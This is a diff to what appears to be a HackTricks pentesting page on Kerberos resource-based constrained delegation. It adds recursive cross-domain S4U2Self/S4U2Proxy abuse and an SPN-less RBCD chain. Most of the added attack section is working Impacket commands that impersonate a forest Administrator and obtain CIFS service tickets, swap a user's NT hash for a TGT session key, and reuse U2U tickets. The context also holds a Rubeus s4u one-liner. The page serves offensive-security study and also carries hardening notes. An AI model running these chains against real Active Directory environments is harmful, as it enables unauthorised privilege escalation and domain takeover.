@@ -226,6 +226,55 @@ python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
   -forest
 ```
 
+### Recursive multi-domain RBCD (3+ domains)
+
+In **multi-domain forests**, both **S4U2Self** and **S4U2Proxy** can be **recursive** instead of stopping after one referral:
+
+- **Recursive S4U2Self**: the first `S4U2Self` is sent to the **impersonated user's domain**, intermediate parent/child hops are traversed with normal `TGS-REQ` referrals for `krbtgt/<REALM>`, and the **final `S4U2Self`** is sent in the **delegating principal's own domain**.
+- This means that **just holding a TGT** for a machine account can be enough to impersonate an **admin from another domain in the same forest** and request `cifs/host`, `host/host`, `wsman/host`, etc.
+- **Recursive S4U2Proxy** follows the trust chain in the same way: intermediate hops reuse the previous ticket as the TGT while requesting the next `krbtgt/<REALM>` referral, and only the last hop returns the final service ticket.
+
+A practical same-forest example is:
+
+```bash
+KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
+  -impersonate Administrator@frperso.local -self \
+  -altservice cifs/min-frperso-01.minus.sub.frperso.local
+
+KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
+  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
+```
+
+### SPN-less cross-domain / cross-forest RBCD
+
+If the **delegating principal is a user without an SPN**, the last recursive `S4U2Self` fails with **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. The workaround is to **retry only the final hop as `S4U2Self+U2U`**.
+
+Short version of the abuse chain:
+
+1. Authenticate with the **NT hash** so the KDC is pushed toward **RC4-HMAC (etype 23)**.
+2. Request **`-self -u2u`** first and keep that ticket separate from the later proxy step.
+3. Extract the **TGT session key** with `describeTicket.py`.
+4. Replace the user's **NT hash** with that **session key** using `changepasswd.py -newhashes <session_key>`.
+5. Reuse the `S4U2Self+U2U` ticket as the **`-additional-ticket`** during a separate **`-proxy`** request.
+
+```bash
+getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
+  -impersonate Administrator@frperso.local -self -u2u
+describeTicket.py Administrator.ccache
+changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
+  -hashes ':<nthash>' -newhashes <tgt_session_key>
+KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
+  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
+  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
+```
+
+Operational caveats:
+
+- When the **first trusted hop is already another forest**, prefer the **branch-aware** algorithm (`getST.py ... -forest`) to match native Windows behavior. If the foreign forest is only reached **later** in the chain, the non-branch-aware recursive flow may still work.
+- On recent **Windows Server 2022/2025** DCs, forced RC4 can fail with **`KDC_ERR_ETYPE_NOSUPP`** because of RC4 deprecation; this can make **SPN-less RBCD impossible** even though classic SPN-backed RBCD still works with AES.
+- Run **`S4U2Self+U2U` before changing the user's hash/password**: `SamrChangePasswordUser` does **not** recompute the account's Kerberos AES keys, so doing the password change first can break later ticket requests.
+- The impersonated account must still be **delegable**: **Protected Users** and accounts with **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** block the chain.
+
 ## Detection / hardening notes
 
 - RBCD paths across domains/forests are still usually created through **ACL abuse** or **relay-to-LDAP**. Enforce **LDAP signing** and **LDAP channel binding** on DCs to break common setup paths.
@@ -296,6 +345,8 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 ## Kerberos Errors
 
 - **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash (or just supply it the rc4, aes128 and aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** during `-self` for a normal user: the delegating principal likely **has no SPN**. Retry the **last hop** as **`S4U2Self+U2U`** instead of a regular `S4U2Self`.
+- **`KDC_ERR_ETYPE_NOSUPP`** during **SPN-less RBCD**: recent DCs may reject the forced **RC4-HMAC** path required by the `S4U2Self+U2U` + session-key-substitution trick. Try a classic **SPN-backed** RBCD path with AES instead.
 - **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
 - **`preauth_failed`**: This means that the given username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
 - **`KDC_ERR_BADOPTION`**: This may mean:
@@ -333,9 +384,12 @@ adws-enumeration.md
 - Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
 - [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 - [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
+- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
 - [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
 - [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
 - [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
+- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
+- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
 
 
 {{#include ../../banners/hacktricks-training.md}}
